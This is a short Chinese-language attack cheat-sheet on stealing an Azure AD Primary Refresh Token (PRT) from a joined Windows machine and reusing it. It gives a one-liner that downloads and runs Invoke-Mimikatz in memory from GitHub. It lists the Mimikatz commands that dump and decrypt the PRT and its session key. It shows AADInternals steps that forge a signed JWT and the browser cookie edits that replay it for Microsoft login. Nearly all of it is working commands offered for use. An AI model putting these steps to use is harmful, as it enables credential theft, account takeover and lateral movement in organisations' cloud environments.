	MimiKatz（2.2.0 及更高版本）可用于通过用于 Azure AD SSO（单点登录）的主刷新令牌 (PRT) 来攻击（混合）加入 Azure AD 的机器进行横向移动攻击。

	运行 mimikatz 获取 PRT
	PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
	PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

	复制 PRT 和 KeyValue
	Mimikatz> privilege::debug
	Mimikatz> token::elevate
	Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

	复制 Context、ClearKey 和 DerivedKey
	Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
	生成 JWT
	PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
	PS AADInternals> $PRT_OF_USER = '...'
	PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
	PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
	PS AADInternals> $ClearKey = "XXYYZZ..."
	PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
	PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
	eyJ0eXAiOiJKV1QiL...
	（ JSON Web 令牌）可以在https://login.microsoftonline.com/login.srf<Signed JWT>的（匿名）浏览器会话中用作 PRT cookie 。 使用以下值编辑 Chrome cookie (F12) -> 应用程序 -> Cookies：

	Name: x-ms-RefreshTokenCredential
	Value: <Signed JWT>
	HttpOnly: √
	️用标志HTTPOnly和标记 cookie Secure。